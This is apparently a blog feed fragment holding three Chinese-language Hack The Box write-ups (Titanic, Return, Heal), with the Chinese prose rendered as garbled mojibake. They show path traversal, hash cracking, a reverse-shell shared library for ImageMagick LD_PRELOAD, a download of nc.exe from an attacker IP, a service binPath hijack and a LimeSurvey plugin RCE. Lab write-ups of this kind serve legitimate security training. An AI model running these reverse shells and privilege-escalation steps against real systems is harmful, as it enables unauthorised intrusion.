    <content type="html"><![CDATA[<h1 id="HTB-Titanic"><a href="#HTB-Titanic" class="headerlink" title="HTB-Titanic"></a>HTB-Titanic</h1><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>22 80ç«¯å£å¼€æ”¾ å°†åŸŸåå’Œipè¿›è¡Œä¸€ä¸ªæ˜ å°„ã€‚ç„¶åæ‰«åå°ï¼Œæ²¡æ‰«å‡ºä»€ä¹ˆï¼Œå°è¯•çˆ†ç ´å­åŸŸåã€‚</p><p>å­˜åœ¨ä¸€ä¸ªå­åŸŸåï¼Œdev æ·»åŠ è¿›å»ã€‚</p><p>devçš„å­åŸŸåæ˜¯ä¸€ä¸ªGiteaã€‚ç„¶åæ¥ç€æ‰«åå°ï¼ŒæŸ¥çœ‹sitemap.xml é‡Œé¢å­˜æ”¾ç€å¦å¤–ä¸€ä¸ªå­åŸŸåã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502161847696.png" alt="image-20250216184653481">**</p><p>è¿™ä¸ªgiteaå…¶å®ä¹Ÿå°±æ˜¯titanic</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502161851352.png" alt="image-20250216185117190"></p><p>ä¹‹å‰æ‰«åˆ°çš„åå°è¿˜æœ‰è¿™ä¸ªä¿¡æ¯ï¼Œå»è®¿é—®çœ‹ä¸€ä¸‹ä¿¡æ¯ï¼Œé‡Œé¢å­˜æ”¾ç€æºç ä¿¡æ¯ï¼Œä»¥åŠä¸€ä¸ªæ•°æ®åº“çš„å¯†ç ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502161908918.png" alt="image-20250216190807811"></p><p>è¿™ä¸ªåœ°æ–¹ï¼Œå­˜åœ¨ä¸€ä¸ªä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502161908941.png" alt="image-20250216190847737"></p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>æ³¨æ„æ—¢ç„¶èƒ½è¿›è¡Œä»»æ„é—®ä»·è¯»å–äº†ï¼Œé‚£å°±å°è¯•è¯»å–giteaçš„é…ç½®æ–‡ä»¶ä¿¡æ¯ã€‚</p><p>ä¸»è¦æ˜¯è·¯å¾„ï¼Œè¿™é‡Œå®ƒæ˜¯åœ¨homeï¼Œdeveloperç”¨æˆ·ä¸‹ é‡Œé¢çš„gitea/data/gitea/conf/app.ini</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/home/</span>developer<span class="hljs-regexp">/gitea/</span>data<span class="hljs-regexp">/gitea/</span>conf/app.ini<br></code></pre></td></tr></table></figure><p>é‡Œé¢æœ‰ä¸€ä¸ªdbæ–‡ä»¶ï¼Œç„¶åè¿›è¡Œè¯»å– åˆšå¼€å§‹è¿˜ä»¥ä¸ºæ˜¯jwtäº†ã€‚ã€‚ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502162121340.png" alt="image-20250216212155155"></p><p>ç„¶åå°±æ˜¯ç”¨sqliteçš„è¯­æ³•ï¼Œè¿›è¡ŒæŸ¥æ•°æ®ã€‚</p><p>é‡Œé¢å­˜åœ¨developerçš„å¯†ç ã€‚</p><p>è¿™ä¸ªæ˜¯ <strong>PBKDF2</strong>åŠ å¯†ç®—æ³•ï¼Œä¹Ÿæœ‰å¯†é’¥ï¼Œæ˜¯1722595646</p><p>è¿™ä¸ªå‚è€ƒï¼š</p><p><a href="https://github.com/hashcat/hashcat/issues/1583">https://github.com/hashcat/hashcat/issues/1583</a></p><p>ä»¥åŠå°†salt passwdå˜æˆbase64çš„è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sqlite3<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">2</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: python3 gitea3hashcat.py &lt;gitea.db&gt;&quot;</span>)<br>    sys.exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">try</span>:<br>    con = sqlite3.connect(sys.argv[<span class="hljs-number">1</span>])<br>    cursor = con.cursor()<br>    cursor.execute(<span class="hljs-string">&quot;SELECT passwd_hash_algo,salt,passwd FROM user&quot;</span>)<br>    <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> cursor.fetchall():<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;pbkdf2&quot;</span> <span class="hljs-keyword">in</span> row[<span class="hljs-number">0</span>]:<br>            algo, iterations, keylen = row[<span class="hljs-number">0</span>].split(<span class="hljs-string">&quot;$&quot;</span>)<br>            algo = <span class="hljs-string">&quot;sha256&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Unknown Algorithm&quot;</span>)<br>        salt = <span class="hljs-built_in">bytes</span>.fromhex(row[<span class="hljs-number">1</span>])<br>        passwd = <span class="hljs-built_in">bytes</span>.fromhex(row[<span class="hljs-number">2</span>])<br>        salt_b64 = base64.b64encode(salt).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>        passwd_b64 = base64.b64encode(passwd).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;algo&#125;</span>:<span class="hljs-subst">&#123;iterations&#125;</span>:<span class="hljs-subst">&#123;salt_b64&#125;</span>:<span class="hljs-subst">&#123;passwd_b64&#125;</span>&quot;</span>)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    sys.exit(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502162317299.png" alt="image-20250216231740066"></p><p>åˆ©ç”¨hashcatè¿›è¡Œçˆ†ç ´ã€‚</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">hashcat -<span class="hljs-selector-tag">a</span> <span class="hljs-number">0</span> -m <span class="hljs-number">10900</span> <span class="hljs-number">1</span><span class="hljs-selector-class">.hash</span> <span class="hljs-string">&#x27;/usr/share/wordlist/rockyou.txt&#x27;</span> <span class="hljs-attr">--show</span><br><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502171041900.png" alt="image-20250217104133863"></p><p>å¾—åˆ°å¯†ç ä¹‹å sshç™»å½•ä¸Šå»ã€‚</p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>åœ¨/opt/scriptsç›®å½•ä¸‹ï¼Œå‘ç°ä¸€ä¸ªshæ–‡ä»¶</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> /opt/app/static/assets/images<br><span class="hljs-built_in">truncate</span> -s 0 metadata.log<br>find /opt/app/static/assets/images/ -<span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;*.jpg&quot;</span> | xargs /usr/bin/magick identify &gt;&gt; metadata.log<br></code></pre></td></tr></table></figure><p>å¤§æ¦‚æ„æ€å°±æ˜¯cdé“imagesç›®å½•ä¸‹ï¼Œç„¶åå°†metadata.logæ–‡ä»¶ç»™æ¸…ç©ºï¼Œç„¶åæŸ¥æ‰¾imagesç›®å½•ä¸‹æ‰€æœ‰çš„jpgæ–‡ä»¶ï¼Œé€šè¿‡xargså¤„ç†å¤šä¸ªjpgæ–‡ä»¶ï¼Œåˆ©ç”¨magickè·å–jpgå›¾ç‰‡çš„å…ƒæ•°æ®ï¼Œè¾“å‡ºåˆ°metadata.logæ–‡ä»¶ä¸­</p><p>æŸ¥çœ‹magickçš„ç‰ˆæœ¬ä¿¡æ¯</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502171943673.png" alt="image-20250217194316470"></p><p>ç‰ˆæœ¬ä¿¡æ¯ä¸º7.1.1-35 åœ¨githubä¸Šæ‰¾åˆ°ç›¸å…³åˆ©ç”¨</p><p><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">gcc -x c -shared -fPIC -o ./libxcb.so.<span class="hljs-number">1</span> - &lt;&lt; EOF<br><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;stdlib.h&gt;</span><br><span class="hljs-comment">#include &lt;unistd.h&gt;</span><br><br>__attribute__((constructor)) void init()&#123;<br>    system(<span class="hljs-string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.89 4444 &gt;/tmp/f&quot;</span>);<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br>EOF<br></code></pre></td></tr></table></figure><p>ç„¶åå†å¤åˆ¶ä¸€å¼ å›¾ç‰‡å‡ºæ¥ï¼Œè®©é‚£ä¸ªshè„šæœ¬è¿è¡Œä¸€ä¸‹ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502172016237.png" alt="image-20250217201605048"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>é¦–å…ˆé€šè¿‡ä¿¡æ¯æ”¶é›†çˆ†ç ´å­åŸŸåï¼Œç„¶åé€šè¿‡æ‰«åå°ï¼Œå‘ç°ä¿¡æ¯æ³„éœ²ï¼Œé€šè¿‡æºç å¾—çŸ¥å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ï¼Œé€šè¿‡ä»»æ„æ–‡ä»¶è¯»å–å¾—åˆ°app.iniçš„å†…å®¹ï¼Œé‡Œé¢å­˜æ”¾ç€æ•°æ®åº“çš„ä½ç½®ï¼Œæ¥ç€è¯»å–ï¼Œç„¶åå¯†ç æ˜¯ä¸€ä¸ªPBKDF2å“ˆå¸ŒåŠ å¯†è¿‡åçš„ï¼Œä¸”å­˜åœ¨åŠ ç›ï¼Œé€šè¿‡ç½‘ä¸Šçš„è„šæœ¬å…ˆæŠŠhashè½¬æˆbase64å½¢å¼çš„ï¼Œç„¶åé€šè¿‡hashcatçˆ†ç ´å¯†ç ï¼Œé€šè¿‡sshç™»å½•ä¸Šå»ï¼Œå†opt/scriptsä¸‹å‘ç°å¯ç–‘shæ–‡ä»¶ï¼Œè¿™ä¸ªshæ–‡ä»¶æ˜¯ä»¥rootçš„èº«ä»½è¿è¡Œï¼Œå¹¶ä¸”å¾—çŸ¥æ˜¯magickçš„ä¸€ä¸ªç”¨æ³•ï¼Œé€šè¿‡æœç´¢ç‰ˆæœ¬ä¿¡æ¯ï¼Œæ‰¾åˆ°åˆ©ç”¨æ¼æ´ï¼Œé€šè¿‡LD_PRELOADåŠ«æŒæ¥è¿›è¡Œä¸€ä¸ªææƒã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Linuxé¶æœºåˆçº§</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Return</title>
    <link href="/2025/02/11/HTB-Return/"/>
    <url>/2025/02/11/HTB-Return/</url>
    
    <content type="html"><![CDATA[<h1 id="Return"><a href="#Return" class="headerlink" title="Return"></a>Return</h1><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502111942468.png" alt="image-20250211194200222"></p><p>è®¿é—®80ç«¯å£ æ˜¯ä¸€ä¸ªæ‰“å°æœºã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502112155935.png" alt="image-20250211215542805"></p><p>è¿™ä¸ªåœ°æ–¹å¯ä»¥åˆ©ç”¨ldapå›ä¼ æ”»å‡» å°†ipæ”¹æˆè‡ªå·±çš„vpnçš„ip ç„¶åç«¯å£ä¸å˜ï¼Œè¿›è¡Œä¸€ä¸ªç›‘å¬</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502112156972.png" alt="image-20250211215640843"></p><p>å¾—åˆ°å¯†ç  1edFg43012!!</p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>ä¸Šé¢çš„5985ç«¯å£å¼€å¯ å¯ä»¥è¯•è¯•winrmç™»å½•</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">evil-winrm -<span class="hljs-selector-tag">i</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">11.108</span> -u <span class="hljs-string">&quot;svc-printer&quot;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&#x27;1edFg43012!!&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502112211006.png" alt="image-20250211221144819"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>whoami /privçœ‹ä¸€ä¸‹</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502112217730.png" alt="image-20250211221716542"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">å°è¯• åˆ©ç”¨SeRestorePrivilegeå’ŒSeShutdownPrivilegeè¿›è¡Œææƒ<br><br>reg save hklm\system C:\Users\svc-printer\Documents\ssytem.hive<br>reg save hklm\sam C:\Users\svc-printer\Documents\sam.hive<br><br>download C:\Users\svc-printer\Documents\ssytem.hive <span class="hljs-regexp">/root/</span>HTB/ssytem.hive<br>download C:\Users\svc-printer\Documents\sam.hive    <span class="hljs-regexp">/root/</span>HTB/sam.hive<br><br>python3 secretsdump.py -sam <span class="hljs-regexp">/root/</span>HTB<span class="hljs-regexp">/sam.hive -system /</span>root<span class="hljs-regexp">/HTB/</span>system.hive  LOCAL <br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502112323761.png" alt="image-20250211232358621"></p><p>å¾—åˆ°administratorçš„å“ˆå¸Œ ç„¶ååˆ©ç”¨è¿™ä¸ªç™»å½•ä¸Šå»ã€‚ä½†æ˜¯è¿™é‡Œæˆ‘ç™»å½•ä¸ä¸Šå» </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502120006073.png" alt="image-20250212000628001"></p><p>net user svc-printer çœ‹ä¸€ä¸‹æ‰€å±ç»„çš„æƒé™</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502120014739.png" alt="image-20250212001427558"></p><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/">https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/</a></p><p>ä¸»è¦æ˜¯Server Operators </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502120037393.png" alt="image-20250212003756295"></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">powershell -<span class="hljs-keyword">c</span> wget <span class="hljs-string">&#x27;http://10.10.14.21:8000/nc64.exe&#x27;</span> -outfile <span class="hljs-string">&#x27;nc.exe&#x27;</span><br>sc.<span class="hljs-keyword">exe</span> config VMTools binPath=<span class="hljs-string">&quot;C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.21 1234&quot;</span><br>sc.<span class="hljs-keyword">exe</span> <span class="hljs-keyword">stop</span> VMTools<br>sc.<span class="hljs-keyword">exe</span> start VMTools<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502120104222.png" alt="image-20250212010409981"></p><p>åŸå…ˆçš„æœåŠ¡è¢«æ›¿æ¢æ‰äº† </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502120111571.png" alt="image-20250212011121253"></p><p>ææƒæˆåŠŸã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Windowsé¶æœºåˆçº§</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Heal</title>
    <link href="/2025/02/07/HTB-Heal/"/>
    <url>/2025/02/07/HTB-Heal/</url>
    
    <content type="html"><![CDATA[<h1 id="HTB-Heal"><a href="#HTB-Heal" class="headerlink" title="HTB-Heal"></a>HTB-Heal</h1><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>æ‰«æç«¯å£ä¿¡æ¯ 22å’Œ80ç«¯å£å¼€æ”¾ã€‚</p><p>å°†åŸŸåå’Œå¯¹åº”ipæ·»åŠ åˆ°/etc/hostsä¸­ </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502072052999.png" alt="image-20250207205220894"></p><p>æ‰«ä¸‹åå° </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">/index.html<br>/robots.txt<br>/manifest.json<br></code></pre></td></tr></table></figure><p>æ²¡ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ã€‚</p><p>è¿›è¡Œå­åŸŸåçˆ†ç ´ï¼Œçœ‹æ˜¯å¦å­˜åœ¨å­åŸŸåã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ffuf</span> -w subdomains-top1million-<span class="hljs-number">110000</span>.txt -u http://heal.htb/ -H <span class="hljs-string">&quot;Host:FUZZ.heal.htb&quot;</span> -mc <span class="hljs-number">200</span> <br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502072247211.png" alt="image-20250207224720029"></p><p>åŒæ ·åŠ åˆ°/etc/hostsä¸­</p><p>è¿™ä¸ªå­åŸŸåæ‰«åå°ä¹Ÿæ²¡å¾—åˆ°ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ å†æ¬¡å›åˆ°heal,htbä¸­ </p><p>è¿›è¡Œä¸€ä¸ªç”¨æˆ·çš„æ³¨å†Œï¼Œç„¶åå°±ä¼šè·³è½¬åˆ°ä¸‹é¢çš„ä¸€ä¸ªåœ°æ–¹ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502072327761.png" alt="image-20250207232710488"></p><p>ç‚¹å‡»surveyä¼šè·³è½¬åˆ°ä¸€ä¸ªæ–°çš„å­åŸŸåä¿¡æ¯ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502092028628.png" alt="image-20250209202838222"></p><p>åŠ åˆ°hostsé‡Œé¢</p><p>æ·»åŠ å®Œæˆä¹‹åèƒ½å¾—åˆ°ä¸€ä¸ªç”¨æˆ·å</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502092128346.png" alt="image-20250209212818278"></p><p>æ‰«åå° æ‰«åˆ°äº†ç™»å½•åœ°å€ /admin/ ç”¨æˆ·åçŸ¥é“ï¼Œä½†æ˜¯å¯†ç ä¸çŸ¥é“</p><p>ä¹‹å‰ æ³¨å†Œå®Œæˆä¹‹å ç™»å½•è¿›å»è¿˜æœ‰ä¸€ä¸ªåœ°æ–¹</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502092133154.png" alt="image-20250209213314094"></p><p>æŠ“åŒ…ä¹‹å å†æ”¾å‡ æ¬¡åŒ…ä¹‹åèƒ½æµ‹å‡ºæ¥ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502092134224.png" alt="image-20250209213452120"></p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>ä¸Šé¢çš„hoståœ°å€æ˜¯api.heal.htb è¿™ä¸ªç½‘ç«™æ˜¯ä¸€ä¸ªRuby on Rails ç½‘ä¸Šæ‰¾ä¸€ä¸‹æ•°æ®åº“å­˜æ”¾çš„ä½ç½® è¯»å–ä¸€ä¸‹æ•°æ®åº“çš„å†…å®¹</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502092137558.png" alt="image-20250209213725492"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502092139768.png" alt="image-20250209213907673"></p><p>è¯»å–ä¸€ä¸‹storage/development.sqlite3</p><p>èƒ½è¯»åˆ°ralphè´¦æˆ·çš„hash</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG<br></code></pre></td></tr></table></figure><p>æ˜¯ä¸€ç§bcryptç”Ÿæˆçš„å“ˆå¸Œå€¼ ç„¶ååˆ©ç”¨johnè¿›è¡Œç ´è§£ä¸€ä¸‹ã€‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">john <span class="hljs-number">1</span>.txt --wordlist=<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt --format=bcrypt<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502092201127.png" alt="image-20250209220146047"></p><p>å¾—åˆ°å¯†ç æ˜¯147258369</p><p>å°è¯•sshç™»å½•è¿›å»ï¼Œå¯†ç ä¸å¯¹ é‚£å°±è¯•ä¸€ä¸‹ä¹‹å‰çš„åå°åœ°å€ï¼ŒæˆåŠŸç™»å½•ã€‚</p><p><a href="https://github.com/Y1LD1R1M-1337/Limesurvey-RCE">https://github.com/Y1LD1R1M-1337/Limesurvey-RCE</a> è¿™æœ‰ä¸€ä¸ªå¯ä»¥ä½¿ç”¨</p><p>å¾—ä¿®æ”¹ä¸€äº›ä¸œè¥¿ </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502092235537.png" alt="image-20250209223537457"></p><p>è¿™ä¸ªåœ°æ–¹åŠ ä¸€ä¸ª6.0 å› ä¸ºç™»å½•è¿›å»çš„å°±æ˜¯6.6.4ç‰ˆæœ¬çš„ã€‚</p><p>ç„¶åé‡æ–°ç”Ÿæˆä¸€ä¸ªzipæ–‡ä»¶ å°†åŸæ¥çš„åˆ é™¤ åˆ›å»ºä¸€ä¸ªåŒæ–‡ä»¶åçš„zipå‹ç¼©åŒ…</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">zip -r Y1LD1R1M.zip config.<span class="hljs-keyword">xml</span> <span class="hljs-title">php-rev</span>.php<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502092237930.png" alt="image-20250209223745867"></p><p>ç„¶åä¸Šä¼ é‚£ä¸ªzipæ–‡ä»¶</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502092253674.png" alt="image-20250209225355613"></p><p>æ‰“å¼€activate</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502092254066.png" alt="image-20250209225455003"></p><p>ç„¶åè®¿é—®</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>take-survey.heal.htb<span class="hljs-regexp">/upload/</span>plugins<span class="hljs-regexp">/Y1LD1R1M/</span>php-rev.php<br></code></pre></td></tr></table></figure><p>å³å¯å¾—åˆ°shell</p><p>å†/var/www/limesurvey/application/configä¸‹æ‰¾åˆ°æ•°æ®åº“çš„å¯†ç </p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-string">&#x27;db_user&#x27;</span>,<br><span class="hljs-string">&#x27;password&#x27;</span> =&gt; <span class="hljs-string">&#x27;AdmiDi0_pA$<span class="hljs-subst">$w0rd</span>&#x27;</span>,<br></code></pre></td></tr></table></figure><p>mysqlæœåŠ¡æ²¡æœ‰ é‚£è¿™ä¸ªå¯†ç å¯èƒ½æ˜¯sshçš„å¯†ç ,å†homeç›®å½•ä¸‹å­˜åœ¨ä¸¤ä¸ªç”¨æˆ· å¦å¤–ä¸€ä¸ªæ˜¯ron å°è¯•äº†ä¸€ä¸‹ï¼Œè¿™ä¸ªå¯†ç å°±æ˜¯ronçš„</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502092312801.png" alt="image-20250209231242744"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>ä¸Šä¼ ä¸€ä¸ªfscançœ‹ä¸€ä¸‹æ˜¯å¦æœ‰å†…ç½‘çš„å…¶ä»–æœåŠ¡ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502092341406.png" alt="image-20250209234121258"></p><p>æœ‰ä¸€ä¸ªå†…ç½‘çš„æœåŠ¡ sshæ˜ å°„å‡ºæ¥ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> -L <span class="hljs-number">8500</span>:<span class="hljs-number">127.0.0.1:8500</span> ron@<span class="hljs-number">10.10.11.46</span> <br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502092357259.png" alt="image-20250209235716122"></p><p>ä¸‹é¢å­˜åœ¨æœåŠ¡å’Œç‰ˆæœ¬ä¿¡æ¯ </p><p><a href="http://exploit-db.com/exploits/51117">http://exploit-db.com/exploits/51117</a>  åˆ©ç”¨è¿™ä¸ªæ¥æ‰“ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502100005178.png" alt="image-20250210000500102"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502100005308.png" alt="image-20250210000511244"></p><p>ææƒæˆåŠŸã€‚</p>]]></content>
